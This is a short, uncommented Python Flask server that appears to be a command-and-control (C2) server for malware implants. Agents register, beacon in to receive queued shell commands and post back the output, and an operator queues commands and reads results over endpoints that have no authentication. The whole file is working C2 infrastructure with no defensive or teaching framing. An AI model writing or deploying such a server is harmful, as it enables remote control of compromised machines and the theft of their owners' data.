from flask import Flask, request, jsonify
import uuid
from datetime import datetime

app = Flask(__name__)
agents = {}
tasks = {}
results = {}

@app.route('/register', methods=['POST'])
def register():
    agent_id = str(uuid.uuid4())
    agents[agent_id] = datetime.now()
    tasks[agent_id] = []
    results[agent_id] = []
    return jsonify({"agent_id": agent_id})

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.json
    agent_id = data.get("agent_id")
    if agent_id in agents:
        agents[agent_id] = datetime.now()
        if tasks[agent_id]:
            cmd = tasks[agent_id].pop(0)
            return jsonify({"task": cmd})
        return jsonify({"task": "none"})
    return jsonify({"error": "invalid agent_id"}), 404

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    agent_id = data.get("agent_id")
    output = data.get("output")
    if agent_id in results:
        results[agent_id].append(output)
        return jsonify({"status": "received"})
    return jsonify({"error": "invalid agent_id"}), 404

@app.route('/task', methods=['POST'])
def task():
    data = request.json
    agent_id = data.get("agent_id")
    command = data.get("command")
    if agent_id in tasks:
        tasks[agent_id].append(command)
        return jsonify({"status": "task queued"})
    return jsonify({"error": "invalid agent_id"}), 404

@app.route('/agents', methods=['GET'])
def get_agents():
    return jsonify({"agents": list(agents.keys())})

@app.route('/results/<agent_id>', methods=['GET'])
def get_results(agent_id):
    return jsonify({"results": results.get(agent_id, [])})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)